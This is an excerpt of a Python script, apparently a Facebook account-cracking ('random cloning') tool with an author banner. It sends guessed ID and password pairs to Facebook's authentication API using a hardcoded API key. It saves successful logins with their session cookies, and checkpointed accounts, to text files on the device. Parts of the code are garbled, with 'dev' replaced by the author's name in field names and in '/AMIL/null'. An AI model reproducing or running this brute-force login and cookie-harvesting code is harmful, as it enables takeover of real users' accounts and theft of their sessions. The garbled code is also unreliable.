...
try:
        ...
        os.system('pip install requests futures==2 > /AMIL/null')
except:pass
...
[+]==============================================
[+]\033[1;32m CREATED BY   : \033[1;32m MOHD ADIL
[+]\033[1;32m FB GROUP     :  \033[1;32m ADIL H3LPING ZON3
[+]\033[1;32m BROTHER      :   \033[1;32mADIL✅KAMRAN
...
def rndmx(ids,pasx,tl):
        global loop,ok
        sys.stdout.write(f'\r{w} (ADIL💙) ({loop}) ({str(ids)}) ({len(ok)}|{len(cp)})');sys.stdout.flush()
        try:
                for pas in pasx:
                        ...
                        data = {'adid':str(uuid.uuid4()),'format':'json','ADILice_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_ADILice_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        ...
                        if 'session_key' in po:
                                uid = po['uid']
                                print(f'\r{g} (ADIL💙) {str(uid)} | {pas} ')
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                if 'y' in cokix:print(f'\r{g} (ADIL) : {coki} ')
                                open('/sdcard/ADIL-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                ok.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                if 'y' in cpx:print(f'\r{r} (ADIL) {str(uid)} | {pas} ')
                                open('/sdcard/AMIL💙-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
